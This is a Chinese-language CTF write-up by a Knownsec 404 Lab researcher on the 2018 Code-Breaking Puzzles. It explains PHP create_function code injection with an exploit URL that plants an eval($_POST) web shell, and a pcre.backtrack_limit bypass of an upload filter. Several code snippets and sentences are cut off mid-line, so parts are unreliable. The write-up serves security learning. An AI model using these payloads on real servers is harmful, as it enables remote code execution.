**作者：LoRexxar'@知道创宇404实验室  
时间：2018年12月7日**
@phith0n 在代码审计小密圈二周年的时候发起了[Code-Breaking Puzzles挑战赛](https://code-breaking.com
"Code-Breaking Puzzles挑战赛")，其中包含了php、java、js、python各种硬核的代码审计技巧。在研究复现the
js的过程中，我花费了大量的精力，也逐渐找到代码审计的一些技巧，这里主要分享了5道ez题目和1道hard的the
js这道题目的writeup，希望阅读本文的你可以从题目中学习到属于代码审计的思考逻辑和技巧。
# easy - function
    function a($a, $b){
        return 111;
    }
然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。
    create_function('$a,$b','return 111;}phpinfo();//')
    ==>
    function a($a, $b){
        return 111;}phpinfo();//
    }
这样一来，我们想要执行的代码就会执行
exp
    http://51.158.75.42:8087/?action=%5Ccreate_function&arg=return%202333;%7Deval($_POST%5B%27ddog%27%5D);%2f%2f
![
](https://images.seebug.org/content/images/2018/12/392afa3f-05a8-40a3-aedb-a0ef3432250b.png-w331s)
# easy pcrewaf
     ].*/is', $data);
    }
    if(empty($_FILES)) {
        die(show_source(__FILE__));
    }
    $user_dir = './data/';
    $data = file_get_contents($_FILES['file']['tmp_name']);
    if (is_php($data)) {
        echo "bad request";
    } else {
        @mkdir($user_dir, 0755);
        $path = $user_dir . '/' . random_int(0, 10) . '.php';
        move_uploaded_file($_FILES['file']['tmp_name'], $path);
        header("Location: $path", true, 303);
    } 
这题自己研究的时候没想到怎么做，不过思路很清楚，文件名不可控，唯一能控制的就是文件内容。
所以问题的症结就在于如何绕过这个正则表达式。
    /].*/is
简单来说就是`反引号`，但很显然，这是不可能的，最少执行函数也需要括号才行。从常规的思路肯定不行
之后看ph师傅的文章我们看到了问题所在，`pcre.backtrack_limit`这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.
![
](https://images.seebug.org/content/images/2018/12/4aedc746-016b-46e7-912f-1f99fa95d096.png-w331s)
而什么是正则引擎回溯呢？
在正则中`.*`表示匹配任意字符任意位，也就是说他会匹配所有的字符，而正则引擎在解析正则的时候必然是逐位匹配的，对于
    ]，问题出现了，上一步匹配到了结尾，后面没有满足要求的符号了。
    从这里开始正则引擎就开始逐渐回溯，知道符合要求的;出现为止
但很显然，服务端不可能不做任何限制，不然如果post一个无限长的数据，那么服务端就会浪费太多的资源在这里，所以就有了`pcre.backtrack_limit`，如果回溯次数超过100万次，那么匹配就会结束，然后跳过这句语句。
回到题目来看，如果能够跳过这句语句，我们就能上传任意文件内容了！
所以最终post就是传一个内容为
稍微阅读一下代码不难发现问题有几个核心点
1、没办法完全控制dig的返回，由于没办法命令注入，所以这里只能执行dig命令，唯一能控制的就是dig的目标，而且返回在显示之前还转义了尖括号，所以
    ; > DiG 9.9.5-9+deb8u15-Debian > -t A -q 1232321321
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER
之前做题的时候曾经遇到过类似的问题，可以通过解base64来隐藏自己要写入的内容绕过过滤，然后php在解析的时候会忽略各种乱码，只会从`> DiG 9.9.5-9+deb8u15-Debian > -t A -q "$domain"
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER
在原来的题目中是用`next(getallheaders())`绕过这个限制的。
但这里getallheaders是apache中的函数，这里是nginx环境，所以目标就是找一个函数其返回的内容是可以控制的就可以了。
问题就在于这种函数还不太好找，首先nginx中并没有能获取all header的函数。
所以目标基本就锁定在会不会有获取cookie，或者所有变量这种函数。在看别人writeup的时候知道了`get_defined_vars`这个函数
他会打印所有已定义的变量（包括全局变量GET等）。简单翻了翻PHP的文档也没找到其他会涉及到可控变量的